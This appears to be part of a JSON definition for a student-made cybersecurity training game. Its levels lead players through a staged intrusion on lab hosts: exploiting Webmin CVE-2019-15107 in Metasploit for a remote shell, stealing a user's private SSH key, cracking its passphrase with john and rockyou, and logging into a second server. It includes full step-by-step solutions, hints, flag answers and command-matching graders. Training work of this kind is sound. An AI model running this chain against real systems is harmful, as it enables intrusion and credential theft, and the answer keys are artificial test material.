+      "content": "The vulnerability CVE-2019-15107 seems promising. Exploit it, gain access to the server (`172.18.1.5`), and **stay connected to it**.\n\n**Flag format**: a five-digit number located in a file in the `/root/` directory on the server.\n\nNote: The exploit contains a bug. After you gain access, if the remote shell does not function properly, type `bash`. It will run, although it will appear waiting (just a flashing underscore character).",
+      "solution": "```\n1. user@attacker:~#  msfconsole\n2. msf6 > search webmin  \n3. msf6 > use exploit/linux/http/webmin_backdoor\n4. msf6 > show options\n5. msf6 > set RHOST 172.18.1.5\n6. msf6 > set RPORT 10000\n7. msf6 > set LHOST 10.10.135.83\n8. msf6 > check\n\nIf Metasploit reports the target as not vulnerable, try to proceed anyway.\n\n9. msf6 > exploit (or run, this is a synonym)\n\nAfter this a new SSH session to the server is created. If the remote shell does not function properly, type `bash`. It will run, although it will appear waiting (just a flashing underscore character), and you can continue with step 10. If it does not work, switch to root using `su root` and continue with step 10.\n\n10. cd /root/\n11. cat WARNING-READ-ME.txt\n```\n\nThe flag is **25790**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which exploit should I use exactly? (more detailed hint)",
+          "content": "The name you are looking for is `exploit/unix/webapp/webmin_backdoor`. You can search it by `search webmin` in the Metasploit tool. Use the `use exploit/unix/webapp/webmin_backdoor` command to activate the exploit. Nevertheless, the exploit is still not applied after that. You have to make some additional steps to apply the exploit on the server.",
+          "hint_penalty": 3,
+          "order": 3
+        },
+        {
+          "title": "How to apply the exploit? (hint for dummies :-)",
+          "content": "First, use the `use exploit/unix/webapp/webmin_backdoor` command to activate the exploit. Then, each activated exploit has its options -- parameters that you must set after you activated the exploit but before you run it. \n\n* `RHOSTS` needs to be set to the IP address of the victim, i.e., `set RHOSTS 172.18.1.5`.\n* `RPORT` needs to be set to desired port number, i.e., 10000.\n* `LHOST` needs to be set to the machine that initiates the exploit (you), i.e., `set LHOST 10.10.135.83`.\n\nThen run the exploit using the command `exploit` or `run`.",
+          "hint_penalty": 5,
+          "order": 6
+        },
+        {
+          "title": "How to apply the exploit? (less detailed hint)",
+          "content": "First, use the `use path-to-exploit` command to activate the exploit. Then, each activated exploit has its options -- parameters that you must set before you run it. Type `show options` to display them. Set the remote server IP and your local IP. Then run the exploit using the command `exploit` or `run`.",
+          "hint_penalty": 1,
+          "order": 4
+        },
+        {
+          "title": "Which file on the server contains the flag?",
+          "content": "`/root/WARNING-READ-ME.txt`",
+          "hint_penalty": 1,
+          "order": 7
+        },
+        {
+          "title": "How to apply the exploit? (more detailed hint)",
+          "content": "First, use the `use path-to-exploit` command to activate the exploit. Then, each activated exploit has its options -- parameters that you must set after you activated the exploit but before you run it. Parameters for this exploit are `RHOSTS` and `LHOST`. Set them to correct values by using `set parameter value`. Then run the exploit using the command `exploit` or `run`.",
+          "hint_penalty": 3,
+          "order": 5
+        },
+        {
+          "title": "What tool to use?",
+          "content": "The tool you are looking for is called **Metasploit**. It's a command-line tool. Run it and use a correct exploit.\n\nExploits in Metasploit are ready-made scripts that automatically attack a vulnerability. They save you time during penetration testing: you do not need to program or download custom exploits, but you simply use existing attack scripts that someone created for the common vulnerabilities.\n\nIf you have never heard of Metasploit, check out the tutorial at https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/",
+          "hint_penalty": 2,
+          "order": 0
+        },
+        {
+          "title": "How to show content of a file?",
+          "content": "Simply `cat path/to/the/file`",
+          "hint_penalty": 1,
+          "order": 8
+        },
+        {
+          "title": "Which exploit should I use?  (less detailed hint)",
+          "content": "The name of the exploit is intuitive. It is a backdoor that includes the name of the service in its name. You can search it easily in the `msfconsole`.",
+          "hint_penalty": 1,
+          "order": 2
+        },
+        {
+          "title": "How to find the correct exploit?",
+          "content": "There is a `search` command in Metasploit (msfconsole) to find the correct exploit. Additional flags for the `search` command can be useful!\n\nTo use the exploit, run `use [path of the exploit]`. It is installed in the `exploit/unix` folder.",
+          "hint_penalty": 2,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 20,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "check",
+          "prereq_state": [
+            "lhost_set",
+            "rhost_set",
+            "rport_set"
+          ],
+          "cmd": "check",
+          "cmd_type": "msf-command",
+          "cmd_regex": "check",
+          "optional": true
+        },
+        {
+          "state_name": "options_showed",
+          "prereq_state": [
+            "metasploit_opened"
+          ],
+          "cmd": "show options",
+          "cmd_type": "msf-command",
+          "cmd_regex": "show options",
+          "optional": true
+        },
+        {
+          "state_name": "rport_set",
+          "prereq_state": [
+            "used_webmin_backdoor"
+          ],
+          "cmd": "set RPORT 10000",
+          "cmd_type": "msf-command",
+          "cmd_regex": "set RPORT 10000",
+          "optional": false
+        },
+        {
+          "state_name": "used_webmin_backdoor",
+          "prereq_state": [
+            "metasploit_opened"
+          ],
+          "cmd": "use exploit/linux/http/webmin_backdoor",
+          "cmd_type": "msf-command",
+          "cmd_regex": "use exploit/linux/http/webmin_backdoor",
+          "optional": false
+        },
+        {
+          "state_name": "lhost_set",
+          "prereq_state": [
+            "used_webmin_backdoor"
+          ],
+          "cmd": "set LHOST 10.10.135.83",
+          "cmd_type": "msf-command",
+          "cmd_regex": "set LHOST 10.10.135.83",
+          "optional": false
+        },
+        {
+          "state_name": "metasploit_opened",
+          "prereq_state": [
+            "vulnerability_identified"
+          ],
+          "cmd": "msfconsole",
+          "cmd_type": "bash-command",
+          "cmd_regex": "msfconsole",
+          "optional": false
+        },
+        {
+          "state_name": "rhost_set",
+          "prereq_state": [
+            "used_webmin_backdoor"
+          ],
+          "cmd": "set RHOST 172.18.1.5",
+          "cmd_type": "msf-command",
+          "cmd_regex": "set RHOST 172.18.1.5",
+          "optional": false
+        },
+        {
+          "state_name": "exploited_by_run",
+          "prereq_state": [
+            "check"
+          ],
+          "cmd": "run",
+          "cmd_type": "msf-command",
+          "cmd_regex": "run",
+          "optional": true
+        },
+        {
+          "state_name": "exploited_by_exploit",
+          "prereq_state": [
+            "check"
+          ],
+          "cmd": "exploit",
+          "cmd_type": "msf-command",
+          "cmd_regex": "exploit",
+          "optional": true
+        },
+        {
+          "state_name": "found_hidden_flag",
+          "prereq_state": [
+            "exploited_by_run",
+            "exploited_by_exploit"
+          ],
+          "cmd": "cat /root/WARNING-READ-ME.txt",
+          "cmd_type": "bash-command",
+          "cmd_regex": "cat .*WARNING-READ-ME.txt",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Find an IP address of the secret server",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "10.1.17.4",
+      "answer_variable_name": null,
+      "content": "Locust 3302 anticipated our attack and notified their members. Most of their data seem to have been deleted, but hopefully, there's still something left elsewhere.\n\nFind the IP address of the new server that they moved their files to. We're not giving up just yet!\n\n**Flag:** IP address of the secret server.",
+      "solution": "```\n1. run ls -a /home/eve on the previously exploited server\n2. display .bash_history file with less .bash_history\n3. scp command is used for copying files to remote server, the IP address is 10.1.17.4\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where exactly to look for the flag",
+          "content": "Try to explore a `.bash_history` file and choose the correct IP address. Don't guess!",
+          "hint_penalty": 6,
+          "order": 1
+        },
+        {
+          "title": "What remote activity to look for (less detailed hint)",
+          "content": "What was the criminal advised to do before deleting his files? To *backup* files to the secret server.",
+          "hint_penalty": 2,
+          "order": 2
+        },
+        {
+          "title": "What remote activity to look for (more detailed hint)",
+          "content": "What was the criminal advised to do before deleting his files? To *backup* files to the secret server. The `scp` command is often used to copy data remotely.",
+          "hint_penalty": 3,
+          "order": 3
+        },
+        {
+          "title": "How to start",
+          "content": "They had to connect to the secret server from this host when they copied the data. Perhaps, some traces of the connection could remain in their homes located at the `/home/` directory.",
+          "hint_penalty": 4,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 20,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "found_right_file",
+          "prereq_state": [
+            "found_hidden_flag"
+          ],
+          "cmd": "ls -a /home/eve",
+          "cmd_type": "bash-command",
+          "cmd_regex": "ls .*eve",
+          "optional": false
+        },
+        {
+          "state_name": "found_ip",
+          "prereq_state": [
+            "found_right_file"
+          ],
+          "cmd": "less .bash_history",
+          "cmd_type": "bash-command",
+          "cmd_regex": "less|cat .*\\.bash_history",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Access the secret server",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": null,
+      "answer": "pinkprincess",
+      "answer_variable_name": null,
+      "content": "Very well, we now have the IP of their \"secret\" server (`10.1.17.4`). But how do we get in? It is surely heavily guarded. Don't try to search for vulnerabilities, that would probably be a waste of time. Search for interesting files on the web server (`172.18.1.5`) you previously exploited. There might be something that will help you access the secret server.\n\n**Flag:** the passphrase to a file that allows you to access the secret server.",
+      "solution": "When Eve was working on the web server, she authenticated to the secret server using an SSH keypair. (Password authentication is turned off.)\n\nThere is a `.ssh` directory with a private SSH key in Eve's directory. Print it on the terminal (`cat /home/eve/.ssh/id_rsa`) and copy it to a local file on your Attacker, so that you can crack it later.\n\nAn alternative way to get the key is to run a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) session (a remote Metasploit shell):\n```\n1. background\n2. msf6 > sessions -u 1\n3. msf6 > sessions -i 2\n4. msf6 > download id_rsa (when in the /home/eve/.ssh folder in the remote shell)\n```\n\nAfter you have the private SSH key, crack its passphrase on the Attacker. Hash the private key using `ssh2john` and crack it with `rockyou.txt` wordlist:  \n1. `user@attacker:~# ssh2john id_rsa > hash`\n2. `user@attacker:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash`\n\nThe passphrase and the flag is **pinkprincess**",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What to do with the file?  (more detailed hint)",
+          "content": "You cannot use the private SSH key without a passphrase. Use a password-cracking tool on your Attacker to find out that passphrase. Then, you will be able to connect to the secret server.\n\nA very popular cracking tool is `john`. Display its manual pages or help for the command. \n\nHowever, `john` needs to convert the private key into a different format before cracking it. Therefore, use the script `ssh2john.py` in the Attacker's `/home/user/` directory for conversion, then the cracking tool `john` with a suitable wordlist (`rockyou.txt`).",
+          "hint_penalty": 5,
+          "order": 4
+        },
+        {
+          "title": "How to copy the file to the Attacker host?",
+          "content": "Just copy-and-paste between terminals: Show the content of the key's file in the terminal (i.e., using `cat file`), select and copy the content, switch to the attacker's terminal, open some text editor, paste the content, and finally save and close the editor. Use `nano` editor, for instance.\n\nAn alternative way to get the key is to run a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) session (a remote Metasploit shell):\n```\n1. background\n2. msf6 > sessions -u 1\n3. msf6 > sessions -i 2\n4. msf6 > download id_rsa (when in the /home/eve/.ssh folder in the remote shell)\n```",
+          "hint_penalty": 3,
+          "order": 2
+        },
+        {
+          "title": "What file to look for?  (more detailed hint)",
+          "content": "Eve used `scp` to connect to the secret server. `scp` uses an SSH connection to copy files. Look for the private SSH key file in the `/home/eve/.ssh` directory on the web server (`172.18.1.5`).",
+          "hint_penalty": 3,
+          "order": 1
+        },
+        {
+          "title": "What to do with the file? (less detailed hint)",
+          "content": "You cannot use the private SSH key without a passphrase. Use a password-cracking tool on your Attacker to find out that passphrase. Then, you will be able to connect to the secret server.\n\nA brute-force attack would take too long, use a dictionary attack instead. In a dictionary attack, the cracking program automatically tries different passphrases from a textual wordlist.\n\nIf the attack is taking too long, look for different dictionaries that are present on your machine in `/usr/share/wordlists/`.",
+          "hint_penalty": 3,
+          "order": 3
+        },
+        {
+          "title": "What file to look for?  (less detailed hint)",
+          "content": "Eve used `scp` to connect to the secret server. `scp` uses an SSH connection to copy files. Try to look for private SSH keys on the web server (`172.18.1.5`).",
+          "hint_penalty": 2,
+          "order": 0
+        },
+        {
+          "title": "What to do with the file?  (for dummies :-)",
+          "content": "You cannot use the private SSH key without a passphrase. Use a password-cracking tool on your Attacker to find out that passphrase. Then, you will be able to connect to the secret server.\n\nA very popular cracking tool is `john`. Display its manual pages or help for the command. \n\nHowever, `john` needs to convert the private key into a different format before cracking it. Therefore, use the script `ssh2john.py` in the Attacker's `/home/user/` directory for conversion, then the cracking tool `john` with a suitable wordlist (`rockyou.txt`):\n1. `user@attacker:~# python3 ssh2john.py id_rsa > hash`\n2. `user@attacker:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash`",
+          "hint_penalty": 6,
+          "order": 5
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 25,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "use_ssh2john",
+          "prereq_state": [
+            "found_ip"
+          ],
+          "cmd": "ssh2john id_rsa > hash",
+          "cmd_type": "bash-command",
+          "cmd_regex": ".*ssh2john .*",
+          "optional": false
+        },
+        {
+          "state_name": "use_john_with_dict",
+          "prereq_state": [
+            "use_ssh2john"
+          ],
+          "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt",
+          "cmd_type": "bash-command",
+          "cmd_regex": "john --wordlist=.*rockyou\\.txt .*",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Steal ░░▒░ from the other server",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "58345",
+      "answer_variable_name": null,
+      "content": "Conn░ct to the░other server with SSH and your newly cr░cked priv░░e key and look▒aro░nd the file syst▒m.░There must░be som░thi▒g there.\n\n**fLaG: tHE numBeR at the LAst L1ne oOoF tHe ▒░▒▒░ fiLE in THe ~/t░p-s▒░r▒t diREKTory**;\n\n(Note: the messed-up characters are intentional as a part of the story.)",
+      "solution": "1. `user@attacker:~# chmod 0600 id_rsa`\n2. `user@attacker:~# ssh -i id_rsa eve@10.1.17.4`\n3. `eve@client:~$ cat top-secret/flag.txt`\n\nThe flag is **58345**.\n\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What to do after connecting with SSH",
+          "content": "Use Eve's private SSH key. You may need to change its permissions.",
+          "hint_penalty": 4,
+          "order": 1
+        },
+        {
+          "title": "SSH hint",
+          "content": "Make sure you're connecting as a correct user.",
+          "hint_penalty": 4,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 15,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "connect",
+          "prereq_state": [
+            "change_rights"
+          ],
+          "cmd": "ssh -i id_rsa eve@10.1.17.4",
+          "cmd_type": "bash-command",
+          "cmd_regex": "ssh -i .* eve@10.1.17.4",
+          "optional": false
+        },
+        {
+          "state_name": "change_rights",
+          "prereq_state": [
+            "use_john_with_dict"
+          ],
+          "cmd": "chmod 0600 id_rsa",
+          "cmd_type": "bash-command",
+          "cmd_regex": "chmod .*",
+          "optional": false
+        },
+        {
+          "state_name": "finish",
+          "prereq_state": [
+            "connect"
+          ],
+          "cmd": "cat top-secret/flag.txt",
+          "cmd_type": "bash-command",
+          "cmd_regex": "cat .*flag.txt",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Congratulations",
+      "level_type": "INFO_LEVEL",
+      "order": 8,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "You have found us, as we wanted you to. We are not what most say. We know things that the top 1% of the top 1% do not want us to know. We need recruits for fighting against them. We have chosen you. \n\nWe are the future. \n\nExpect us to be contacting you soon. \n\n**▒░░░░░░|<0by1k/\\\\░3302░▒** \n\nEpstein did not kill himself.\n\n---\n\nCredits: [storyline inspiration](https://en.wikipedia.org/wiki/Cicada_3301)\n\nMade by students of the *Seminar on Simulation of Cyber Attacks* course in December 2019."
+    }
+  ],
+  "estimated_duration": 80,
+  "variant_sandboxes": false
 }
